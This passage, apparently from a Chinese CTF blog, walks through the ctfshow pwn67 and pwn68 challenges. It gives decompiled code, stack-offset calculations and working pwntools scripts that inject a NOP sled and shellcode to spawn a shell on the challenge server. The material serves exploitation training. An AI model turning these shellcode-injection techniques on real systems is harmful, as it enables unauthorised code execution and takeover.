id="pwn67-nop-sled-shellcode"><a class="anchor" href="#pwn67-nop-sled-shellcode">#</a> pwn67 （nop sled  -&gt;shellcode）</h1>
<h2 id="1题目"><a class="anchor" href="#1题目">#</a> 1. 题目</h2>
<p>题目描述： <code>32bit nop sled</code></p>
<p>32 位程序，有可执行段，但是有 canary</p>
<pre><code>Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
</code></pre>
<p><code>main函数:</code></p>
<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// bad sp value at call has been detected, the output may be wrong!</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>v5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-1010h] BYREF</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> seed<span class="token punctuation">[</span><span class="token number">1027</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-100Ch] BYREF</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>  seed<span class="token punctuation">[</span><span class="token number">1025</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>argc<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  seed<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token function">logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token function">Loading</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token function">acquire_satellites</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  v3 <span class="token operator">=</span> <span class="token function">query_position</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We need to load the ctfshow_flag.\nThe current location: %p\n"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What will you do?\n> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>seed<span class="token punctuation">,</span> <span class="token number">4096</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Where do you start?\n> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%p"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token function">v5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>Loading 函数和 acquire_satellites () 函数就是起一个等待的作用，没什么用</p>
<p><code>query_position()函数：</code></p>
<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">query_position</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment">// [esp+3h] [ebp-15h] BYREF</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-14h]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>  v4 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  v2 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">1337</span> <span class="token operator">-</span> <span class="token number">668</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v1 <span class="token operator">+</span> v2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">return</span> <span class="token operator">&amp;</span>v1 <span class="token operator">+</span> v2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>在 main 函数会给我们一个被偏移过的栈地址（v3），然后让我们输入 seed，利用最后的 <code>__isoc99_scanf(&quot;%p&quot;, &amp;v5);</code>  让我们输入地址，然后就执行这个地方的命令</p>
<h2 id="2漏洞分析"><a class="anchor" href="#2漏洞分析">#</a> 2. 漏洞分析</h2>
<p>在 query_position 函数里，返回的值是 v1 的地址 + v2 这个随机数，v1 是栈上的地址，那么就能通过大致计算出 v1 的地址来确定我们需要执行的 shellcode 的输入位置，但是无法准确的计算出 shellcode 的地址，那么就需要利用 <code>nop sled</code>  (空操作雪橇)，下滑到 shellcode 的位置执行</p>
<p>具体 <code>sled</code>  操作需要利用汇编来看：</p>
<pre><code class="language-asm">.text:08048945 ; __unwind &#123;
.text:08048945                 lea     ecx, [esp+4]
.text:08048949                 and     esp, 0FFFFFFF0h
.text:0804894C                 push    dword ptr [ecx-4]
.text:0804894F                 push    ebp
.text:08048950                 mov     ebp, esp
.text:08048952                 push    ebx
.text:08048953                 push    ecx
.text:08048954                 sub     esp, 1010h
.text:0804895A                 call    __x86_get_pc_thunk_bx
.text:0804895F                 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)
.text:08048965                 mov     eax, large gs:14h
.text:0804896B                 mov     [ebp+var_C], eax
.text:0804896E                 xor     eax, eax
.text:08048970                 mov     eax, ds:(stdout_ptr - 804B000h)[ebx]
.text:08048976                 mov     eax, [eax]
.text:08048978                 sub     esp, 8
.text:0804897B                 push    0               ; buf
.text:0804897D                 push    eax             ; stream
.text:0804897E                 call    _setbuf
.text:08048983                 add     esp, 10h
.text:08048986                 call    logo
.text:0804898B                 lea     eax, [ebp+seed]
.text:08048991                 sub     esp, 0Ch
.text:08048994                 push    eax             ; seed
.text:08048995                 call    _srand
.text:0804899A                 add     esp, 10h
.text:0804899D                 call    Loading
.text:080489A2                 call    acquire_satellites
.text:080489A7                 call    query_position
.text:080489AC                 sub     esp, 8
.text:080489AF                 push    eax
.text:080489B0                 lea     eax, (aWeNeedToLoadTh - 804B000h)[ebx] ; &quot;We need to load the ctfshow_flag.\nThe &quot;...
.text:080489B6                 push    eax             ; format
.text:080489B7                 call    _printf
.text:080489BC                 add     esp, 10h
.text:080489BF                 sub     esp, 0Ch
.text:080489C2                 lea     eax, (aWhatWillYouDo - 804B000h)[ebx] ; &quot;What will you do?\n&gt; &quot;
.text:080489C8                 push    eax             ; format
.text:080489C9                 call    _printf
.text:080489CE                 add     esp, 10h
.text:080489D1                 mov     eax, ds:(stdin_ptr - 804B000h)[ebx]
.text:080489D7                 mov     eax, [eax]
.text:080489D9                 sub     esp, 4
.text:080489DC                 push    eax             ; stream
.text:080489DD                 push    1000h           ; n
.text:080489E2                 lea     eax, [ebp+seed]
.text:080489E8                 push    eax             ; s
.text:080489E9                 call    _fgets
.text:080489EE                 add     esp, 10h
.text:080489F1                 sub     esp, 0Ch
.text:080489F4                 lea     eax, (aWhereDoYouStar - 804B000h)[ebx] ; &quot;Where do you start?\n&gt; &quot;
.text:080489FA                 push    eax             ; format
.text:080489FB                 call    _printf
.text:08048A00                 add     esp, 10h
.text:08048A03                 sub     esp, 8
.text:08048A06                 lea     eax, [ebp+var_1010]
.text:08048A0C                 push    eax
.text:08048A0D                 lea     eax, (aP - 804B000h)[ebx] ; &quot;%p&quot;
.text:08048A13                 push    eax
.text:08048A14                 call    ___isoc99_scanf
.text:08048A19                 add     esp, 10h
.text:08048A1C                 mov     eax, [ebp+var_1010]
.text:08048A22                 call    eax
.text:08048A24                 mov     eax, 0
.text:08048A29                 mov     edx, [ebp+var_C]
.text:08048A2C                 xor     edx, large gs:14h
.text:08048A33                 jz      short loc_8048A3A
.text:08048A35                 call    __stack_chk_fail_local

</code></pre>
<p>首先  <code>push ebp</code>  使 esp-4；然后 <code>push ebx; push ecx;</code> esp 变为：esp-4-4-4；接着 <code>sub esp,0x1010</code>  使 esp-4-4-4-0x1010；然后有 <code>sub esp,8；push 0;push eax;</code>  使 esp-4-4-4-0x1010-8-4-4；在 call _setbuf 的下一条指令有 <code>add esp,0x10</code>  使 esp-4-4-4-0x1010-8-4-4+0x10；后面有 <code>sub esp,0xc</code>  使 esp-4-4-4-0x1010-8-4-4+0x10-0xc；然后 <code>push eax ; ... ; add esp,0x10 </code> 使 esp-4-4-4-0x1010-8-4-4+0x10-0xc-4+0x10=esp-0x101c；【这里到了 <code>query_position</code> 】</p>
<p>后面的其实已经不用算了：接着 <code>sub esp,8,push eax; ... ; push eax;</code>  使 esp-4-4-4-0x1010-8-4-4+0x10-0xc-4+0x10-0x8-4-4=esp-0x102c，到了第一个 call printf 下面 <code>add esp,0x10;sub esp,0xc ;... ; push eax</code>  使 esp=esp-0x102c+0x10-0xc-4 ; 第二个 call printf 下面 <code>add esp,0x10; ... ; sub esp,4; push eax;push 1000h; ... ; push eax</code>  esp=esp-0x102c+0x10-0xc-4+0x10-4-4-4-4=esp-0x102c；到了 call fgets 下面 <code>add esp ,0x10; sub esp ,0xc ; push eax;</code>  esp=esp-0x102c+0x10-0xc-4=esp -0x102c；在最后一个 call printf 下 <code>add esp,0x10; sub esp ,8;...; push eax; push eax;</code>  esp=esp-0x102c+0x10-8-4-4=0x102c ; 最后的 call scanf  <code>add esp ,0x10</code>  esp=esp-0x102c+0x10=esp-0x101c</p>
<p>而 输入的 seed 距离 main 的 ebp 为 0x100c</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/04RK81R%60%25%60ZD_%5D0%5B0D99%253J.png" alt="" /></p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/YS%253ATQAXL%296XBY6PRM%282PT.png" alt="" /></p>
<p>我们能通过 v1 的地址来得到 seed 的地址，而函数给我们输出了 <code>v1地址+一个随机数的值</code> ，这个随机数是 <code>v2 = rand() % 1337 - 668;</code> 【-668~688】，意味着 <code>v1的地址-最大的可能668-与seed的偏移</code> 就一定会在输入的 seed 中：</p>
<p>x=&amp;v1+random（x 为给出来的地址）<br />
seed=&amp;v1+0x29（0x1035-0x100c=0x29//0x2c?）</p>
<p>seed=x-random+0x29【只要假设 <code>减掉的</code>  random 最大，也就是 seed 地址处于最高地址的情况（random 取 <code>负668</code> ）】</p>
<p><code>seed=x+668+0x29</code>  但是如果这个地方不是我们真的存放 shellcode 的位置，那么可能无法执行 shellcode（因为是假设 seed 为所在范围最高的地址），我们要保障输入的 shellcode 一定要超过这个位置，以免真实地址大于我们输入的 shellcode 的地址；</p>
<p>因为 seed 可能的最低地址为 <code>seed=x-668+0x29</code>  所以我们需要在这个区间内利用 <code>nop</code>  命令来填充 1136 个字节（第 1137 个可以刚好执行，并且可以输入 4096 个字节，不用担心大小不够），以确保能够执行在这个 <code>范围外(指seed的最低地址与最高地址)</code>  部的 <code>shellcode</code></p>
<p>【这个地方也就是意味着计算出来的 seed 在这个范围内都有可能，那么我们就必须保障 shellcode 超出这个范围，因为执行的 v5 地址在 shellcode 后面或者中间，就无法正确 getshell】</p>
<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token number">28112</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The current location: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"addr:"</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'\x90'</span><span class="token operator">*</span><span class="token number">1136</span><span class="token operator">+</span>shellcode<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">668</span><span class="token operator">+</span><span class="token number">0x2d</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MjYzNTE3MC9hcnRpY2xlL2RldGFpbHMvMTMxOTg1NTE4">https://blog.csdn.net/weixin_52635170/article/details/131985518</span></p>
<h1 id="pwn6864位sled-shellcode"><a class="anchor" href="#pwn6864位sled-shellcode">#</a> pwn68（64 位 sled -&gt;shellcode）</h1>
<h2 id="题目描述"><a class="anchor" href="#题目描述">#</a> 题目描述：</h2>
<p>题目描述： <code>64bit nop sled</code></p>
<p>64 位程序</p>
<pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
</code></pre>
<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>v5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-1018h] BYREF</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">char</span> seed<span class="token punctuation">[</span><span class="token number">4104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-1010h] BYREF</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+1018h] [rbp-8h]</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token function">logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token function">Loading</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token function">acquire_satellites</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  v3 <span class="token operator">=</span> <span class="token function">query_position</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We need to load the ctfshow_flag.\nThe current location: %p\n"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What will you do?\n> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token function">fgets</span><span class="token punctuation">(</span>seed<span class="token punctuation">,</span> <span class="token number">4096</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Where do you start?\n> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%p"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token function">v5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">query_position</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Bh] [rbp-15h] BYREF</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-14h]</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>  v2 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">1337</span> <span class="token operator">-</span> <span class="token number">668</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">return</span> <span class="token operator">&amp;</span>v1 <span class="token operator">+</span> v2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>与上一题基本相同，只是这次变成了 64 位了，所以一个字就变成了 8 字节</p>
<p>根据汇编，一直到 <code>call query_position</code>  计算栈的情况</p>
<p>函数栈的位置：esp=esp-8-0x1020</p>
<p>然后 seed 在 rbp-0x1010 处，v5 在 rbp-0x1018 处</p>
<p>可以得出结构：</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/Q%7D%7BFV%5BXL%7EDZ%402GF5Y6M_4GU.png" alt="" /></p>
<p>得到的地址是 v1 地址 + 一个随机数（-668~668），我们所要填充的 shellcode 的地址要绕过这些随机的可能地址，所以要选择一个最高的地址（）</p>
<p>x=v1+random;<br />
seed=v1+0x35；<br />
 <code>seed=x-random+0x35</code> 【这里取 seed 的最大地址，因为要执行的 seed 被假设为可能范围内最大的地址，这样 shelldode 一定在外部】</p>
<p>所以 seed 可能的取值为 <code>seed =x-668+0x35</code>  到 <code>seed=x+668+0x35</code> , 所以要跨越这个区间（1336 保障了一定能越过 seed 的最大地址），在区间外部的地址输入 shellcode 就行（需要利用 <code>nop</code>  来 sled）</p>
<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token number">28205</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The current location: "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"addr:"</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'\x90'</span><span class="token operator">*</span><span class="token number">1336</span><span class="token operator">+</span>shellcode<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">668</span><span class="token operator">+</span><span class="token number">0x35</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><div class="tags"><a href="/tags/pwn/" rel="tag"><i class="ic i-tag"></i>pwn</a></div></div><footer><div class="meta"><span class="icon"><i class="ic i-eye"></i></span><span>此文章已被阅读次数:</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="2023/10/21/pwn/刷题/ctfshow/58-68/">正在加载...</span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2025-01-13 12:49:31" itemprop="dateModified" datetime="2025-01-13T12:49:31+08:00">2025-01-13</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>vvwwv<i class="ic i-at"><em>@</em></i>此时相望不相闻，愿逐月华流照君</li><li class="link"><strong>本文链接：</strong><a href="https://vvwwvv.cn/2023/10/21/pwn/%E5%88%B7%E9%A2%98/ctfshow/58-68/" title="CTFshow(栈溢出部分,58~68)">https://vvwwvv.cn/2023/10/21/pwn/刷题/ctfshow/58-68/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2023/10/20/pwn/%E5%88%B7%E9%A2%98/BUUCTF/cmcc_simplerop/" rel="prev" itemprop="url" 